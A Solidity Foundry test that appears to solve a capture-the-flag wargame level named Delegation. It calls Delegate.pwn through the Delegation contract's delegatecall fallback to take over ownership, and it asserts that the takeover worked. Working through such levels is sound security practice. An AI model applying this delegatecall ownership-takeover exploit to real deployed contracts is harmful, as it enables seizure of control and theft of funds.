// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

import {Delegate,Delegation} from "../src/6.Delegation.sol";
contract DelegationHackTest is Test {
  Delegate delegate;
  Delegation delegation;
  function setUp() public {
    delegate = new Delegate(address(0));
    vm.prank(address(0));
    delegation = new Delegation(address(delegate));
    console.log("delegation init owner", delegation.owner());
  }
  function hack() internal {
     bytes memory callData = abi.encodeWithSelector(Delegate.pwn.selector);
     address(delegation).call(callData);
  }
  function testDelegationHack() public {
    hack();
    assertEq(delegation.owner(), address(this));
    console.log("delegation hacked owner", delegation.owner());
  }
}